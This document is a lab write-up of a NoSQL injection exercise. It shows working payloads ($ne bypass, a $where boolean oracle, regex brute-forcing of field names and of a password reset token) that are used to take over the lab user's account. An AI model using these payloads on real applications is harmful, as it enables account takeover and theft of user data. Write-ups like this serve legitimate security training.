## 1. Initial reconnaissance
- Observed login behavior for user `carlos`.
- `POST /login` returned: “Account locked: please reset your password”.
- Indicates Carlos exists and system checks `locked` state.

## 2. Testing methodology
### Step 1: Validate NoSQL injection
```
{"username":"carlos","password":{"$ne":"invalid"}}
```
Response: still “Account locked” → `$ne` works.

### Step 2: Validate `$where`
```
{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
```
→ “Invalid username or password”

```
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```
→ “Account locked”

This establishes the true/false extraction channel.

## 3. Payload construction
### Step 1: Extract field names
Brute force using:
```
Object.keys(this)[i].match('^.{j}c.*')
```
Intruder setup:
- i = 0–15  
- j = 0–15  
- letters a–z, A–Z  

Recovered keys:
`id, username, password, email, resetToken`.

### Step 2: Extract resetToken
Used regex-based brute forcing:
```
this.resetToken.match('^.{$i}$c.*')
```
Intruder lists:
- Position index = 0–15  
- Characters = a–z, A–Z, 0–9  

Correct guesses returned length **209**, incorrect **151**.

Recovered 16‑character reset token.

## 4. Completing the attack
1. Requested:
```
/forgot-password?resetToken=<token>
```
2. In Burp → **Request in browser → Original session**.
3. Changed Carlos’s password.
4. Logged in normally as `carlos`.
5. Lab successfully completed.
